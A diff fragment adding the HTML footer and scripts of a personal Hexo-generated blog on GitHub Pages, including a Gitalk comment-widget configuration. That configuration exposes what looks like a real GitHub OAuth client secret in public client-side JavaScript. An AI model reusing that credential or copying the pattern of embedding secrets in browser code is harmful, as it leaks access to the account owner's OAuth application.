+        <li><a href="https://github.com/HarryPangPang" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://github.com/HarryPangPang/HarryPangPang.github.io/issues/4" target="_blank" title="Email" data-toggle=tooltip data-placement=top><i class="icon icon-email"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <!-- <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"> -->
+  <script src="//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+  <script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '109cd41cf54566dc4c4c',
+    clientSecret: 'e5b1bc7f8bb1c5a376d23cb52e00d951b310dac4',
+    repo: 'HarryPangPang.github.io',
+    owner: 'HarryPangPang',
+    admin: ['HarryPangPang'],
+    id: md5(location.pathname),
+    distractionFreeMode: true,
+    language: 'zh-CN',
+    enableHotKey: 'true'
+  })
+  gitalk.render('comments')
+  </script>
+      
+
+
+
+
+
+
+
+</body>
+</html>
